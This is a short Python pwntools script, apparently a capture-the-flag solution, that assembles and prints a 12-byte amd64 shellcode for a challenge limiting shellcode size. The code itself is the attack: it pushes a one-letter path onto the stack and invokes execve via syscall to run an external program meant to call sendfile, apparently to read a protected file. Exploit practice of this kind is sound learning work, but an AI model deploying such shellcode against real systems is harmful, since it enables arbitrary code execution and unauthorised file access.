from pwn import *

context.arch = 'amd64'

'''
this challenge only allow 12 bytes shellcode.

use execve() call external program which call sendfile()
'''

sc = asm('''
push 0x61
mov rdi, rsp
xor esi, esi
cdq
mov al, 0x3b
syscall
''')

print(disasm(sc))
print(len(sc))
